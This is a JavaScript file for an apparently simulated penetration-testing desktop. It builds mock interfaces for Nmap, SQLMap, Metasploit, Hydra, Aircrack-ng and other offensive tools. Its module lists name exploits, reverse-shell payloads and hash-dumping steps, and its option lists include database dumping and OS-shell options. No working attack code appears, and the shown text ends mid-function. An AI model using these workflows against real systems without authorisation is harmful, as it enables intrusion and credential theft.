/* ============================================
   BUILD YOU TOO - All Tool Apps
   apps.js
   ============================================ */

// ============ APP DEFINITIONS ============
const APP_DEFS = {
  terminal: { title: 'Terminal', icon: '💻', w: 780, h: 480 },
  filemanager: { title: 'File Manager', icon: '📁', w: 780, h: 520 },
  nmap: { title: 'Nmap Network Scanner', icon: '🌐', w: 820, h: 580 },
  hashcracker: { title: 'Hash Cracker', icon: '🔐', w: 740, h: 560 },
  sqlmap: { title: 'SQLMap', icon: '💉', w: 800, h: 560 },
  metasploit: { title: 'Metasploit Framework', icon: '🎯', w: 860, h: 580 },
  wireshark: { title: 'Wireshark - Packet Analyzer', icon: '📡', w: 900, h: 580 },
  aircrack: { title: 'Aircrack-ng', icon: '📻', w: 780, h: 540 },
  burpsuite: { title: 'Burp Suite Community', icon: '🔥', w: 860, h: 580 },
  hydra: { title: 'Hydra - Brute Force', icon: '🐉', w: 760, h: 520 },
  john: { title: 'John the Ripper', icon: '🗝️', w: 740, h: 500 },
  browser: { title: 'BYT Browser', icon: '🌍', w: 820, h: 560 },
  texteditor: { title: 'Text Editor', icon: '📝', w: 720, h: 500 },
  settings: { title: 'Settings', icon: '⚙️', w: 700, h: 520 },
  sysinfo: { title: 'System Information', icon: '📊', w: 720, h: 540 },
  whois: { title: 'Whois Lookup', icon: '🔍', w: 700, h: 480 },
  dnslookup: { title: 'DNS Lookup', icon: '📡', w: 700, h: 480 },
  traceroute: { title: 'Traceroute', icon: '🗺️', w: 700, h: 480 },
  subdomains: { title: 'Subdomain Finder', icon: '🕸️', w: 720, h: 500 },
  nikto: { title: 'Nikto Web Scanner', icon: '🛡️', w: 760, h: 520 },
  openvas: { title: 'OpenVAS', icon: '🔬', w: 760, h: 520 },
  wpscan: { title: 'WPScan', icon: '📰', w: 740, h: 500 },
  xsshunter: { title: 'XSS Hunter', icon: '⚡', w: 760, h: 520 },
  dirb: { title: 'DirBuster', icon: '📂', w: 760, h: 520 },
  wordlist: { title: 'Wordlist Generator', icon: '📋', w: 700, h: 500 },
  wifianalyzer: { title: 'WiFi Analyzer', icon: '📶', w: 780, h: 520 },
  kismet: { title: 'Kismet', icon: '📡', w: 800, h: 560 },
  setoolkit: { title: 'Social Engineer Toolkit', icon: '🎭', w: 780, h: 540 },
  shellgen: { title: 'Shellcode Generator', icon: '🐚', w: 760, h: 520 },
  arpspoof: { title: 'ARP Spoofer', icon: '⚠️', w: 720, h: 480 },
  sslstrip: { title: 'SSLStrip', icon: '🔓', w: 720, h: 480 },
  binwalk: { title: 'Binwalk', icon: '🔎', w: 740, h: 500 },
  autopsy: { title: 'Autopsy Digital Forensics', icon: '🔬', w: 860, h: 580 },
  steghide: { title: 'Steghide', icon: '🖼️', w: 700, h: 480 },
  mcphub: { title: 'MCP Hub - Server & Tool Manager', icon: '⚡', w: 880, h: 620 },
  aicopilot: { title: 'AI Pentest Copilot (MCP)', icon: '🤖', w: 860, h: 620 },
};

// ============ HTML BUILDERS ============
function buildTerminalHTML(winId) {
  return `
  <div class="terminal-container" id="tc-${winId}">
    <div class="terminal-tabs" id="ttabs-${winId}">
      <div class="term-tab active" id="tab0-${winId}" onclick="switchTermTab(0,'${winId}')">bash 1</div>
      <div class="term-add-tab" onclick="addTermTab('${winId}')">＋</div>
    </div>
    <div class="terminal-output" id="to-0-${winId}"></div>
    <div class="terminal-input-row">
      <span class="terminal-prompt-label" id="tprompt-${winId}">┌──(root㉿byt)-[~]<br>└─# </span>
      <input class="terminal-input" id="ti-${winId}" type="text" autocomplete="off" spellcheck="false"
        onkeydown="termKeyDown(event,'${winId}')" placeholder="" />
    </div>
  </div>`;
}

function buildNmapHTML(winId) {
  return `
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">🌐</div>
      <div class="tool-header-info">
        <h3>Nmap 7.94SVN - Network Scanner</h3>
        <p>Network discovery and security auditing</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-section-title">Target</div>
        <div class="tool-row">
          <div class="tool-field"><label>Target IP / Range</label>
            <input class="tool-input" id="nmap-target-${winId}" placeholder="192.168.1.0/24 or target.com" />
          </div>
          <div class="tool-field"><label>Port Range</label>
            <input class="tool-input" id="nmap-ports-${winId}" value="1-1000" />
          </div>
          <div class="tool-field"><label>Scan Type</label>
            <select class="tool-select" id="nmap-type-${winId}">
              <option value="sS">-sS SYN Stealth</option>
              <option value="sV">-sV Version Detection</option>
              <option value="sU">-sU UDP Scan</option>
              <option value="O">-O OS Detection</option>
              <option value="A">-A Aggressive</option>
              <option value="sn">-sn Ping Sweep</option>
              <option value="p-">-p- All Ports</option>
            </select>
          </div>
        </div>
        <div class="tool-section-title">Options</div>
        <div class="tool-checkboxes">
          <label class="tool-check-item"><input type="checkbox" id="nmap-os-${winId}"> OS Detection</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-sv-${winId}" checked> Version Detect</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-sc-${winId}"> Default Scripts</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-v-${winId}"> Verbose</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-6-${winId}"> IPv6</label>
          <label class="tool-check-item"><input type="checkbox" id="nmap-t5-${winId}"> Timing T5</label>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runNmap('${winId}')">▶ Start Scan</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${winId}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${winId}')">Clear</button>
      </div>
      <div class="tool-progress" id="nmap-prog-${winId}"><div class="tool-progress-bar" id="nmap-bar-${winId}"></div></div>
      <div class="tool-output" id="nmap-out-${winId}">
        <span class="out-info">// Ready. Enter a target and click Start Scan.</span>
      </div>
    </div>
  </div>`;
}

function buildHashCrackerHTML(winId) {
  return `
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">🔐</div>
      <div class="tool-header-info">
        <h3>Hash Cracker</h3>
        <p>Identify and crack common hash types using wordlists</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-section-title">Hash Type</div>
        <div class="hash-types" id="hash-types-${winId}">
          ${['MD5','SHA-1','SHA-256','SHA-512','NTLM','bcrypt','LM','MySQL','CRC32','Whirlpool','RIPEMD-160','SHA-3'].map((h,i)=>
            `<div class="hash-type-btn${i===0?' active':''}" onclick="selectHashType(this,'${h}','${winId}')">${h}</div>`
          ).join('')}
        </div>
      </div>
      <div class="tool-section">
        <div class="tool-row">
          <div class="tool-field" style="flex:2"><label>Hash Value</label>
            <input class="tool-input" id="hash-val-${winId}" placeholder="Paste hash here..." />
          </div>
          <div class="tool-field"><label>Attack Mode</label>
            <select class="tool-select" id="hash-mode-${winId}">
              <option>Dictionary Attack</option>
              <option>Brute Force</option>
              <option>Rainbow Table</option>
              <option>Hybrid Attack</option>
            </select>
          </div>
        </div>
        <div class="tool-row">
          <div class="tool-field"><label>Wordlist</label>
            <select class="tool-select" id="hash-wl-${winId}">
              <option>rockyou.txt (14.3M words)</option>
              <option>darkweb2017.txt (9.8M words)</option>
              <option>kaonashi.txt (6.7M words)</option>
              <option>hashkiller.txt (3.2M words)</option>
              <option>custom.txt</option>
            </select>
          </div>
          <div class="tool-field"><label>Charset (Brute)</label>
            <input class="tool-input" id="hash-charset-${winId}" value="abcdefghijklmnopqrstuvwxyz0123456789" />
          </div>
          <div class="tool-field"><label>Max Length</label>
            <input class="tool-input" id="hash-len-${winId}" value="8" style="width:60px" />
          </div>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runHashCracker('${winId}')">▶ Start Cracking</button>
        <button class="tool-btn btn-success" onclick="identifyHash('${winId}')">🔍 Identify Hash</button>
        <button class="tool-btn" style="border:1px solid var(--accent-cyan);color:var(--accent-cyan)" onclick="generateHash('${winId}')">⚡ Generate Hashes</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${winId}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${winId}')">Clear</button>
      </div>
      <div class="tool-progress" id="hash-prog-${winId}"><div class="tool-progress-bar" id="hash-bar-${winId}"></div></div>
      <div class="tool-output" id="hash-out-${winId}">
        <span class="out-info">// Paste a hash, select type, and click Start Cracking.</span>
      </div>
    </div>
  </div>`;
}

function buildSQLMapHTML(winId) {
  return `
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">💉</div>
      <div class="tool-header-info">
        <h3>SQLMap 1.7.11 - SQL Injection Tool</h3>
        <p>Automatic SQL injection and database takeover</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-row">
          <div class="tool-field" style="flex:2"><label>Target URL</label>
            <input class="tool-input" id="sql-url-${winId}" placeholder="https://target.com/page.php?id=1" />
          </div>
          <div class="tool-field"><label>HTTP Method</label>
            <select class="tool-select" id="sql-method-${winId}">
              <option>GET</option><option>POST</option>
            </select>
          </div>
        </div>
        <div class="tool-row">
          <div class="tool-field"><label>POST Data</label>
            <input class="tool-input" id="sql-data-${winId}" placeholder="username=admin&password=test" />
          </div>
          <div class="tool-field"><label>Technique</label>
            <select class="tool-select" id="sql-tech-${winId}">
              <option value="B">Boolean-based blind</option>
              <option value="E">Error-based</option>
              <option value="U">Union query</option>
              <option value="S">Stacked queries</option>
              <option value="T">Time-based blind</option>
              <option value="Q">Inline queries</option>
            </select>
          </div>
          <div class="tool-field"><label>DBMS</label>
            <select class="tool-select" id="sql-dbms-${winId}">
              <option>Auto-Detect</option>
              <option>MySQL</option>
              <option>PostgreSQL</option>
              <option>MSSQL</option>
              <option>Oracle</option>
              <option>SQLite</option>
            </select>
          </div>
        </div>
        <div class="tool-checkboxes">
          <label class="tool-check-item"><input type="checkbox" id="sql-dbs-${winId}"> --dbs (databases)</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-tables-${winId}"> --tables</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-dump-${winId}"> --dump</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-batch-${winId}" checked> --batch</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-rand-${winId}"> --random-agent</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-crawl-${winId}"> --crawl</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-tor-${winId}"> --tor</label>
          <label class="tool-check-item"><input type="checkbox" id="sql-shell-${winId}"> --os-shell</label>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runSQLMap('${winId}')">▶ Run SQLMap</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${winId}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${winId}')">Clear</button>
      </div>
      <div class="tool-progress" id="sql-prog-${winId}"><div class="tool-progress-bar" id="sql-bar-${winId}"></div></div>
      <div class="tool-output" id="sql-out-${winId}">
        <span class="out-info">// Enter a URL with parameters and click Run SQLMap.</span>
      </div>
    </div>
  </div>`;
}

function buildMetasploitHTML(winId) {
  return `
  <div class="msf-container">
    <div class="msf-sidebar">
      <div class="msf-cat">Auxiliary</div>
      ${['scanner/portscan/tcp','scanner/smb/smb_ms17_010','scanner/http/http_version','scanner/ftp/ftp_version','scanner/ssh/ssh_version','gather/shodan_search'].map(m=>
        `<div class="msf-module-item" onclick="selectMSFModule(this,'${m}','${winId}')">${m}</div>`
      ).join('')}
      <div class="msf-cat">Exploits</div>
      ${['windows/smb/ms17_010_eternalblue','unix/ftp/vsftpd_234_backdoor','multi/handler','windows/mssql/mssql_payload','multi/samba/usermap_script','linux/http/apache_mod_cgi_bash_env'].map(m=>
        `<div class="msf-module-item" onclick="selectMSFModule(this,'${m}','${winId}')">${m}</div>`
      ).join('')}
      <div class="msf-cat">Payloads</div>
      ${['windows/meterpreter/reverse_tcp','linux/x86/meterpreter/reverse_tcp','cmd/unix/reverse_bash','python/meterpreter/reverse_tcp'].map(m=>
        `<div class="msf-module-item" onclick="selectMSFModule(this,'${m}','${winId}')">${m}</div>`
      ).join('')}
      <div class="msf-cat">Post</div>
      ${['multi/recon/local_exploit_suggester','windows/gather/hashdump','linux/gather/hashdump'].map(m=>
        `<div class="msf-module-item" onclick="selectMSFModule(this,'${m}','${winId}')">${m}</div>`
      ).join('')}
    </div>
    <div class="msf-main">
      <div style="padding:10px 14px;background:var(--bg-darker);border-bottom:1px solid var(--border);font-family:var(--font-mono);font-size:0.78rem;color:var(--accent-cyan)" id="msf-module-title-${winId}">
        msf6 > select a module from the list
      </div>
      <div style="padding:12px;display:flex;flex-direction:column;gap:8px;background:var(--bg-darker);border-bottom:1px solid var(--border)" id="msf-options-${winId}">
        <div style="font-family:var(--font-mono);font-size:0.7rem;color:var(--text-dim)">Select a module to configure options</div>
      </div>
      <div class="terminal-output" id="msf-out-${winId}" style="flex:1;min-height:200px">
        <span class="info" style="color:var(--accent-red);font-weight:700">
       ___  ___  ___ ___  ___ ___ _    ___  ___ _____ <br>
      | __|/   \| __| __|| __| __| |  / _ \|_ _|_   _|<br>
      | _| | - || _|| _| | _|| _|| |_| (_) || |  | |  <br>
      |___|\___|_|  |_|  |_| |___|____|___/|___| |_|  <br>
        </span>
        <br>
        <span class="info" style="color:var(--text-secondary)">       =[ metasploit v6.3.44-dev            ]<br>
+ -- --=[ 2376 exploits - 1232 auxiliary - 415 post ]<br>
+ -- --=[ 1171 payloads - 46 encoders - 11 nops     ]<br>
+ -- --=[ 9 evasion                                  ]<br></span>
        <br>
        <span class="prompt">msf6 > </span>
      </div>
      <div class="terminal-input-row">
        <span class="terminal-prompt-label">msf6 > </span>
        <input class="terminal-input" id="msf-input-${winId}" onkeydown="msfCommand(event,'${winId}')" placeholder="type help for commands..." />
      </div>
    </div>
  </div>`;
}

function buildWiresharkHTML(winId) {
  let rows = '';
  const protos = ['TCP','UDP','HTTP','DNS','ARP','ICMP','TCP','UDP','HTTP','DNS','TCP','UDP','ICMP','HTTP','ARP'];
  const ips = ['192.168.1.101','10.0.0.5','172.16.0.2','192.168.1.1','10.10.10.50','8.8.8.8','192.168.0.15'];
  for(let i=0; i<15; i++){
    const p = protos[i]; const src = ips[Math.floor(Math.random()*ips.length)];
    const dst = ips[Math.floor(Math.random()*ips.length)];
    const len = Math.floor(Math.random()*1400)+40;
    const colors = {TCP:'pkt-tcp',UDP:'pkt-udp',HTTP:'pkt-http',DNS:'pkt-dns',ARP:'pkt-arp',ICMP:'pkt-icmp'};
    rows += `<tr onclick="inspectPacket(this,'${p}','${src}','${dst}','${winId}')"><td>${i+1}</td><td>${(i*0.123).toFixed(3)}</td><td>${src}</td><td>${dst}</td>
      <td class="${colors[p]||''}">${p}</td><td>${len}</td><td class="out" style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${getPacketInfo(p)}</td></tr>`;
  }
  return `
  <div class="tool-panel ws-inspector-container">
    <div class="tool-header">
      <div class="tool-icon">📡</div>
      <div class="tool-header-info">
        <h3>Wireshark 4.2.0 - Packet Analyzer</h3>
        <p>Live packet capture, protocol dissection, and hex inspector</p>
      </div>
    </div>
    <div style="padding:6px 12px;background:var(--bg-darker);border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:center">
      <input class="tool-input" style="flex:1;padding:5px 10px;font-size:0.78rem" id="ws-filter-${winId}" placeholder="Filter: tcp.port == 80 or ip.addr == 192.168.1.1" />
      <button class="tool-btn btn-primary" style="padding:5px 12px" onclick="applyWsFilter('${winId}')">Apply</button>
      <button class="tool-btn btn-success" style="padding:5px 12px" onclick="startCapture('${winId}')">▶ Capture</button>
      <button class="tool-btn btn-danger" style="padding:5px 12px" onclick="stopCapture('${winId}')">■ Stop</button>
    </div>
    <div style="flex:1;overflow-y:auto;max-height:180px">
      <table class="packet-table" id="ws-table-${winId}">
        <thead><tr><th>No.</th><th>Time</th><th>Source</th><th>Destination</th><th>Protocol</th><th>Length</th><th>Info</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
    </div>
    <!-- Protocol Details Pane -->
    <div class="ws-details-pane" id="ws-details-${winId}">
      <span style="color:var(--text-dim)">Click any packet in the table above to dissect protocol headers...</span>
    </div>
    <!-- Hex Dump Pane -->
    <div class="ws-hex-pane" id="ws-hex-${winId}">
      <span style="color:var(--text-dim)">Raw packet payload hex dump</span>
    </div>
    <div style="padding:6px 12px;background:var(--bg-darker);border-top:1px solid var(--border);font-family:var(--font-mono);font-size:0.72rem;color:var(--text-dim)">
      <span id="ws-status-${winId}">Capturing on eth0 | 15 packets captured | Promiscuous mode: ACTIVE</span>
    </div>
  </div>`;
}

function getPacketInfo(proto) {
  const info = {
    TCP: ['SYN Seq=0 Win=65535 Len=0','ACK Seq=1 Ack=1 Win=64240','FIN, ACK Seq=156 Ack=230','PSH, ACK Seq=230 Ack=157'],
    UDP: ['Source port: 53, Destination port: 1024','Source port: 1234, Destination port: 443'],
    HTTP: ['GET /index.php HTTP/1.1','POST /login HTTP/1.1','HTTP/1.1 200 OK'],
    DNS: ['Standard query 0x1234 A google.com','Standard query response 0x1234 A 142.250.77.78'],
    ARP: ['Who has 192.168.1.1? Tell 192.168.1.100','192.168.1.1 is at 00:1a:2b:3c:4d:5e'],
    ICMP: ['Echo (ping) request id=0x0001 seq=1/256','Echo (ping) reply id=0x0001 seq=1/256'],
  };
  const arr = info[proto] || ['Unknown packet'];
  return arr[Math.floor(Math.random()*arr.length)];
}

function buildAircrackHTML(winId) {
  return `
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">📻</div>
      <div class="tool-header-info">
        <h3>Aircrack-ng 1.7</h3>
        <p>WiFi network security assessment suite</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-section-title">Interface & Mode</div>
        <div class="tool-row">
          <div class="tool-field"><label>Interface</label>
            <select class="tool-select" id="air-iface-${winId}">
              <option>wlan0</option><option>wlan1</option><option>wlan0mon</option>
            </select>
          </div>
          <div class="tool-field"><label>Mode</label>
            <select class="tool-select" id="air-mode-${winId}">
              <option>airodump-ng (Capture)</option>
              <option>aircrack-ng (Crack)</option>
              <option>aireplay-ng (Inject)</option>
              <option>airmon-ng (Monitor)</option>
            </select>
          </div>
          <div class="tool-field"><label>Channel</label>
            <input class="tool-input" id="air-ch-${winId}" value="all" />
          </div>
        </div>
        <div class="tool-row">
          <div class="tool-field" style="flex:2"><label>BSSID / Target</label>
            <input class="tool-input" id="air-bssid-${winId}" placeholder="AA:BB:CC:DD:EE:FF (optional)" />
          </div>
          <div class="tool-field"><label>Capture File</label>
            <input class="tool-input" id="air-cap-${winId}" value="capture" />
          </div>
        </div>
      </div>
      <div class="tool-section">
        <div class="tool-section-title">Detected Networks</div>
        <div class="tool-output" style="min-height:120px">
          <span class="out-header">BSSID              PWR  Beacons  #Data  CH  MB   ENC   CIPHER AUTH  ESSID</span><br>
          ${generateFakeNetworks()}
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runAircrack('${winId}')">▶ Start</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${winId}')">■ Stop</button>
        <button class="tool-btn btn-success" onclick="enableMonitor('${winId}')">📻 Enable Monitor Mode</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${winId}')">Clear</button>
      </div>
      <div class="tool-progress" id="air-prog-${winId}"><div class="tool-progress-bar" id="air-bar-${winId}"></div></div>
      <div class="tool-output" id="air-out-${winId}">
        <span class="out-info">// Select interface and mode, then click Start.</span>
      </div>
    </div>
  </div>`;
}

function generateFakeNetworks() {
  const nets = [
    ['AA:BB:CC:DD:EE:01','-62','120','45','6','54','WPA2','CCMP','PSK','HomeNetwork_5G'],
    ['11:22:33:44:55:02','-71','89','12','11','54','WPA2','CCMP','PSK','NETGEAR_Office'],
    ['DE:AD:BE:EF:00:03','-55','234','128','1','54','WEP','WEP','OPN','OldRouter'],
    ['FE:DC:BA:98:76:04','-80','45','3','6','300','WPA2','CCMP','PSK','iPhone_Hotspot'],
    ['00:11:22:33:44:05','-67','156','67','6','54','WPA3','CCMP','SAE','SecureNet_2.4'],
  ];
  return nets.map(n=>
    `<span class="out-line">${n[0]}   ${n[1]}  ${n[2]}       ${n[3]}  ${n[4]}  ${n[5]}  ${n[6]}  ${n[7]}    ${n[8]}   ${n[9]}</span>`
  ).join('<br>');
}

function buildBurpSuiteHTML(winId) {
  return `
  <div class="tool-panel" style="height:100%">
    <div class="burp-tabs" id="burp-tabs-${winId}">
      <div class="burp-tab active" onclick="switchBurpTab('proxy','${winId}')">Proxy</div>
      <div class="burp-tab" onclick="switchBurpTab('scanner','${winId}')">Scanner</div>
      <div class="burp-tab" onclick="switchBurpTab('repeater','${winId}')">Repeater</div>
      <div class="burp-tab" onclick="switchBurpTab('intruder','${winId}')">Intruder</div>
      <div class="burp-tab" onclick="switchBurpTab('decoder','${winId}')">Decoder</div>
    </div>
    <div class="tool-body" id="burp-body-${winId}">
      <!-- Proxy Tab -->
      <div id="burp-proxy-${winId}" class="burp-section">
        <div class="tool-section">
          <div class="tool-section-title">Proxy Settings</div>
          <div class="tool-row">
            <div class="tool-field"><label>Listen Port</label><input class="tool-input" value="8080" id="burp-port-${winId}" /></div>
            <div class="tool-field"><label>Bind Address</label><input class="tool-input" value="127.0.0.1" id="burp-bind-${winId}" /></div>
            <div class="tool-field" style="justify-content:flex-end">
              <button class="tool-btn btn-success" onclick="toggleProxy('${winId}')">▶ Start Proxy</button>
            </div>
          </div>
        </div>
        <div class="tool-section">
          <div class="tool-section-title">Intercepted Requests</div>
          <div class="tool-output" style="min-height:160px" id="burp-intercept-${winId}">
            <span class="out-info">// Proxy is stopped. Start the proxy to intercept traffic.</span>
          </div>
        </div>
        <div class="tool-section">
          <div class="tool-section-title">HTTP History</div>
          <div class="tool-output" style="min-height:80px">
            <span class="out-header">Method  URL                                  Status  Length  MIME</span><br>
            <span class="out-success">GET     /index.php                           200     4521    HTML</span><br>
            <span class="out-warn">POST    /login.php                           302     0       -</span><br>
            <span class="out-line">GET     /dashboard.php                       200     8934    HTML</span>
          </div>
        </div>
      </div>
    </div>
  </div>`;
}

function buildHydraHTML(winId) {
  return `
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">🐉</div>
      <div class="tool-header-info">
        <h3>Hydra 9.5 - Brute Force Login Tool</h3>
        <p>Online password brute force attack tool</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-row">
          <div class="tool-field"><label>Target IP</label><input class="tool-input" id="hydra-ip-${winId}" placeholder="192.168.1.1" /></div>
          <div class="tool-field"><label>Port</label><input class="tool-input" id="hydra-port-${winId}" placeholder="22" /></div>
          <div class="tool-field"><label>Service</label>
            <select class="tool-select" id="hydra-svc-${winId}">
              <option>ssh</option><option>ftp</option><option>http-post-form</option>
              <option>rdp</option><option>smtp</option><option>pop3</option>
              <option>imap</option><option>mysql</option><option>mssql</option>
              <option>vnc</option><option>telnet</option><option>ldap</option>
            </select>
          </div>
        </div>
        <div class="tool-row">
          <div class="tool-field"><label>Username / List</label><input class="tool-input" id="hydra-user-${winId}" placeholder="admin or users.txt" /></div>
          <div class="tool-field"><label>Password / List</label><input class="tool-input" id="hydra-pass-${winId}" placeholder="password or rockyou.txt" /></div>
          <div class="tool-field"><label>Threads</label><input class="tool-input" id="hydra-threads-${winId}" value="16" /></div>
        </div>
        <div class="tool-checkboxes">
          <label class="tool-check-item"><input type="checkbox" id="hydra-v-${winId}" checked> Verbose</label>
          <label class="tool-check-item"><input type="checkbox" id="hydra-vv-${winId}"> Very Verbose</label>
          <label class="tool-check-item"><input type="checkbox" id="hydra-s-${winId}"> SSL</label>
          <label class="tool-check-item"><input type="checkbox" id="hydra-r-${winId}"> Restore</label>
          <label class="tool-check-item"><input type="checkbox" id="hydra-e-${winId}"> Empty password</label>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runHydra('${winId}')">▶ Start Attack</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${winId}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${winId}')">Clear</button>
      </div>
      <div class="tool-progress" id="hydra-prog-${winId}"><div class="tool-progress-bar" id="hydra-bar-${winId}"></div></div>
      <div class="tool-output" id="hydra-out-${winId}">
        <span class="out-info">// Configure target and credentials, then click Start Attack.</span>
      </div>
    </div>
  </div>`;
}

function buildJohnHTML(winId) {
  return `
  <div class="tool-panel">
    <div class="tool-header">
      <div class="tool-icon">🗝️</div>
      <div class="tool-header-info">
        <h3>John the Ripper 1.9.0-jumbo-1</h3>
        <p>Offline password hash cracker</p>
      </div>
    </div>
    <div class="tool-body">
      <div class="tool-section">
        <div class="tool-row">
          <div class="tool-field" style="flex:2"><label>Hash File or Paste Hashes</label>
            <textarea class="tool-input" id="john-hashes-${winId}" rows="4" style="resize:none"
              placeholder="root:$6$salt$hash...&#10;admin:$1$abc$xyz...&#10;Or paste hashes directly"></textarea>
          </div>
          <div class="tool-field">
            <div class="tool-field"><label>Format</label>
              <select class="tool-select" id="john-format-${winId}">
                <option>auto</option><option>md5crypt</option><option>sha512crypt</option>
                <option>descrypt</option><option>bfegg</option><option>krb5</option>
                <option>NT</option><option>bcrypt</option><option>raw-MD5</option>
              </select>
            </div>
            <div class="tool-field" style="margin-top:8px"><label>Mode</label>
              <select class="tool-select" id="john-mode-${winId}">
                <option value="wordlist">Wordlist</option>
                <option value="incremental">Incremental</option>
                <option value="single">Single Crack</option>
                <option value="rules">Rules-based</option>
              </select>
            </div>
            <div class="tool-field" style="margin-top:8px"><label>Wordlist</label>
              <select class="tool-select" id="john-wl-${winId}">
                <option>/usr/share/wordlists/rockyou.txt</option>
                <option>/usr/share/wordlists/fasttrack.txt</option>
                <option>/usr/share/wordlists/john.lst</option>
              </select>
            </div>
          </div>
        </div>
      </div>
      <div class="tool-row">
        <button class="tool-btn btn-primary" onclick="runJohn('${winId}')">▶ Start Cracking</button>
        <button class="tool-btn btn-success" onclick="johnShow('${winId}')">👁 Show Cracked</button>
        <button class="tool-btn btn-danger" onclick="stopTool('${winId}')">■ Stop</button>
        <button class="tool-btn" style="border:1px solid var(--border);color:var(--text-dim)" onclick="clearOutput('${winId}')">Clear</button>
      </div>
      <div class="tool-progress" id="john-prog-${winId}"><div class="tool-progress-bar" id="john-bar-${winId}"></div></div>
      <div class="tool-output" id="john-out-${winId}">
        <span class="out-info">// Paste hashes or upload a hash file, then click Start Cracking.</span>
      </div>
    </div>
  </div>`;
}

function buildBrowserHTML(winId) {
  return `
  <div style="display:flex;flex-direction:column;height:100%">
    <div class="browser-toolbar">
      <button class="browser-nav-btn" onclick="browserNav('back','${winId}')">◀</button>
      <button class="browser-nav-btn" onclick="browserNav('fwd','${winId}')">▶</button>
      <button class="browser-nav-btn" onclick="browserNav('reload','${winId}')">↻</button>
      <input class="browser-url-bar" id="browser-url-${winId}" value="byt://newtab" onkeydown="browserGo(event,'${winId}')" />
      <button class="browser-nav-btn" onclick="browserGo({key:'Enter'},'${winId}')">→</button>
    </div>
    <div class="browser-body" id="browser-body-${winId}">
      <div class="browser-homepage">
        <h2>🐉 Build <span class="accent-u">U</span> Too</h2>
        <p style="color:var(--text-dim);font-family:var(--font-mono);font-size:0.8rem">Penetration Testing Browser</p>
        <div class="browser-search-bar">
          <input id="browser-search-${winId}" type="text" placeholder="Search Exploit-DB, CVE, tools..." />
          <button onclick="browserSearch('${winId}')">Search</button>
        </div>
        <div class="browser-bookmarks">
          ${[['🔴','Exploit-DB','https://exploit-db.com'],['📋','CVE Details','https://cvedetails.com'],
             ['🔧','OWASP','https://owasp.org'],['🌐','Shodan','https://shodan.io'],
             ['📡','NVD','https://nvd.nist.gov'],['🔐','HaveIBeenPwned','https://haveibeenpwned.com']
          ].map(([icon,name,url])=>
            `<div class="bookmark-item" onclick="document.getElementById('browser-url-${winId}').value='${url}';browserLoad('${url}','${winId}')">
              <div class="bookmark-icon">${icon}</div>${name}</div>`
          ).join('')}
        </div>
      </div>
    </div>
  </div>`;
}

function buildTextEditorHTML(winId) {
  return `
  <div style="display:flex;flex-direction:column;height:100%">
    <div class="editor-toolbar">
      <button class="editor-btn" onclick="editorNew('${winId}')">New</button>
      <button class="editor-btn" onclick="editorSave('${winId}')">Save</button>
      <button class="editor-btn" onclick="editorOpen('${winId}')">Open</button>
      <div style="flex:1"></div>
      <select class="tool-select" style="font-size:0.72rem;padding:3px 8px" id="editor-lang-${winId}">
        <option>Plain Text</option><option>Python</option><option>Bash</option>
        <option>JavaScript</option><option>PHP</option><option>Ruby</option><option>Perl</option>
      </select>
    </div>
    <div style="display:flex;flex:1;overflow:hidden">
      <div style="background:#0a0c10;padding:10px 6px;font-family:var(--font-mono);font-size:0.82rem;
        line-height:1.7;color:var(--text-dim);text-align:right;min-width:42px;border-right:1px solid var(--border);
        overflow:hidden;user-select:none" id="editor-lines-${winId}">1</div>
      <textarea class="editor-area" id="editor-area-${winId}"
        oninput="updateEditorLines('${winId}')"
        onscroll="syncEditorScroll('${winId}')"
        placeholder="# BuildU Text Editor&#10;# Start typing..."></textarea>
    </div>
    <div class="editor-statusbar">
      <span id="editor-pos-${winId}">Ln 1, Col 1</span>
      <span id="editor-lang-status-${winId}">Plain Text</span>
      <span>UTF-8</span>
      <span>LF</span>
    </div>
  </div>`;
}

function buildSettingsHTML(winId) {
  return `
  <div class="settings-layout">
    <div class="settings-sidebar">
      <div class="settings-sidebar-item active" onclick="switchSettings('appearance','${winId}',this)">🎨 Appearance</div>
